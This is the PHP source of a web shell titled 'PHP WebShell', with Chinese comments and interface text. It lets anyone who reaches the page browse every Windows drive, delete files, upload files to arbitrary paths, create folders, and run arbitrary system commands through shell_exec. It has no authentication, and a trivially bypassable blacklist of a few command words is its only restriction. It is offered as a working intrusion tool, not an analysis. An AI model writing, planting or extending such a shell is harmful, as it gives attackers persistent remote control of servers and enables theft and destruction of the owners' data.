<?php
// 设置默认路径（根目录表示查看所有磁盘）
$path = isset($_GET['path']) ? $_GET['path'] : '';

// 列出所有磁盘（仅适用于 Windows）
function listDrives() {
    $drives = [];
    foreach (range('C', 'Z') as $drive) {
        $drivePath = $drive . ':\\';
        if (is_dir($drivePath)) {
            $drives[] = $drivePath;
        }
    }
    echo "<h2>系统磁盘</h2><ul>";
    foreach ($drives as $d) {
        echo "<li><a href='?path=" . urlencode($d) . "'>$d</a></li>";
    }
    echo "</ul>";
}

// 列出指定目录下的文件和文件夹
function listFiles($dir) {
    echo "<h2>目录内容：$dir</h2><ul>";
    if (!is_dir($dir)) {
        echo "<li>无效目录</li></ul>";
        return;
    }

    $files = scandir($dir);
    foreach ($files as $file) {
        if ($file === '.') continue;
        $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
        $urlPath = urlencode($fullPath);
        if (is_dir($fullPath)) {
            echo "<li>[目录] <a href='?path=$urlPath'>$file</a></li>";
        } else {
            echo "<li>[文件] $file 
                <a href='?path=" . urlencode($dir) . "&delete=" . urlencode($file) . "' onclick='return confirm(\"确认删除?\")'>删除</a>
            </li>";
        }
    }
    echo "</ul>";
}

// 文件删除处理
if (isset($_GET['delete'])) {
    $fileToDelete = rtrim($path, '\\/') . DIRECTORY_SEPARATOR . $_GET['delete'];
    if (is_file($fileToDelete)) {
        unlink($fileToDelete);
        echo "文件已删除<br>";
    }
}

// 上传文件处理
if (isset($_FILES['file'])) {
    $uploadPath = rtrim($path, '\\/') . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
    move_uploaded_file($_FILES['file']['tmp_name'], $uploadPath);
    echo "文件上传成功<br>";
}

// 新建目录处理
if (isset($_POST['new_folder'])) {
    $newFolder = rtrim($path, '\\/') . DIRECTORY_SEPARATOR . basename($_POST['new_folder']);
    mkdir($newFolder);
    echo "目录创建成功<br>";
}
?>

<h1>PHP WebShell</h1>

<?php
if (empty($path)) {
    listDrives();
} else {
    echo "<p><a href='?'>返回磁盘列表</a></p>";
    listFiles($path);
}
?>
<?php
// 处理系统命令执行请求
$command_output = '';
if (isset($_POST['sys_command'])) {
    $cmd = $_POST['sys_command'];

    // 可选：限制命令长度或屏蔽危险命令
    $blacklist = ['rm ', 'del ', 'format', 'shutdown', 'reboot'];
    $blocked = false;
    foreach ($blacklist as $bad) {
        if (stripos($cmd, $bad) !== false) {
            $command_output = "⚠️ 命令被拦截，可能存在安全风险。";
            $blocked = true;
            break;
        }
    }

    if (!$blocked) {
              $raw_output = shell_exec($cmd . " 2>&1");
$command_output = mb_convert_encoding($raw_output, 'UTF-8', 'GBK');
    }
}
?>

<form method="post" enctype="multipart/form-data">
    上传文件: <input type="file" name="file">
    <input type="submit" value="上传">
</form>

<form method="post">
    新建目录: <input type="text" name="new_folder">
    <input type="submit" value="创建">
</form>
<h2>🛠️ 执行系统命令</h2>
<form method="post">
    <input type="text" name="sys_command" size="60" placeholder="输入系统命令">
    <input type="submit" value="执行">
</form>

<?php if ($command_output !== ''): ?>
    <h3>执行结果：</h3>
    <pre style="background:#f0f0f0; padding:10px; border:1px solid #ccc;"><?php echo htmlspecialchars($command_output); ?></pre>
<?php endif; ?>
